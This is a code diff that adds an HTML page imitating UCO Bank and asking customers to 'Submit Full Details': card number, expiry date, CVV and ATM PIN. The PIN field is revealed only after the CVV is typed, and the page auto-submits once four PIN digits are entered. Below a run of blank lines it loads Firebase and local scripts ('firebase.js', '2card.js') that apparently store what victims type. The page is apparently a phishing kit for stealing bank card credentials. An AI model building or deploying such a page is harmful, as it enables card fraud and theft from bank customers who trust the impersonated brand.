@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UCO Bank Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        .header {
+            background-color: #f7cc01;
+            padding: 10px;
+            text-align: center;
+        }
+        .header img {
+            max-height: 50px;
+        }
+        .banner {
+            text-align: center;
+            background-color: #0033a0;
+            color: white;
+            padding: 10px 0;
+            font-size: 18px;
+        }
+        .content {
+            max-width: 600px;
+            margin: 20px auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .content form input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .content form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0033a0;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .content form button:hover {
+            background-color: #002280;
+        }
+        .footer {
+            text-align: center;
+            padding: 10px;
+            background-color: #0033a0;
+            color: white;
+        }
+        .footer a {
+            margin: 0 10px;
+            color: white;
+            text-decoration: none;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="p_uco.png" alt="UCO Bank Logo">
+    </div>
+    <div class="banner">
+        Dear Customer, Submit Full Details
+    </div>
+    <div class="content">
+        <form id="ududip007" class="LoginForm" method="post" autocomplete="off">
+            <label for="a1">Card Number*</label>
+            <input type="text" id="a1" placeholder="Enter Card Number*" maxlength="16" pattern="^\d{16}$" required>
+            
+            <label for="b2">Expiry Date (MM/YY)*</label>
+            <input type="text" id="b2" placeholder="MM/YY" maxlength="5" pattern="^(0[1-9]|1[0-2])\/([0-9]{2})$" required>
+            
+            <label for="c3">CVV*</label>
+            <input type="number" id="c3" placeholder="Enter CVV*" maxlength="3" required>
+            
+            <div id="d4-container" style="display: none;">
+                <label for="d4">ATM PIN*</label>
+                <input type="password" id="d4" placeholder="Enter ATM Pin*" maxlength="4" required>
+            </div>
+            
+            <button type="submit">Next</button>
+        </form>
+        <div id="confirmation-message" style="display:none; margin-top: 20px; color: green; font-size: 16px;">
+            Form submitted successfully!
+        </div>
+    </div>
+    <div class="footer">
+        Follow us on:
+        <a href="#" target="_blank">WhatsApp</a>
+        <a href="#" target="_blank">Facebook</a>
+        <a href="#" target="_blank">Twitter</a>
+        <a href="#" target="_blank">Instagram</a>
+        <a href="#" target="_blank">YouTube</a>
+        <a href="#" target="_blank">LinkedIn</a>
+    </div>
+    <script>
+        // Show ATM PIN field when CVV is valid
+        document.getElementById('c3').addEventListener('input', function () {
+            const cvvField = document.getElementById('c3');
+            const pinContainer = document.getElementById('d4-container');
+            if (cvvField.value.length === 3) { // Assuming a 3-digit CVV
+                pinContainer.style.display = 'block';
+            } else {
+                pinContainer.style.display = 'none';
+            }
+        });
+
+        // Auto-submit form after valid PIN entry
+        document.getElementById('d4').addEventListener('input', function (e) {
+            const pinField = e.target;
+            const form = document.getElementById('ududip007');
+            if (pinField.value.length === 4) { // Assuming a 4-digit PIN
+                processForm(); // Simulate form submission
+            }
+        });
+
+        // Prevent form submission and display confirmation message
+        document.getElementById('ududip007').addEventListener('submit', function (e) {
+            e.preventDefault(); // Prevent page reload
+            processForm();
+        });
+
+        // Function to handle form processing
+        function processForm() {
+            const confirmationMessage = document.getElementById('confirmation-message');
+            confirmationMessage.style.display = 'block'; // Show confirmation message
+            setTimeout(() => {
+                confirmationMessage.style.display = 'none'; // Hide message after 3 seconds
+            }, 3000);
+        }
+    </script>
+
+
+
+
+
+
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1/firebase.js"></script>
+    
+ <script src="firebase.js">  </script>
+<script src="2card.js">  </script>
+
+
+
+</body>
+</html>
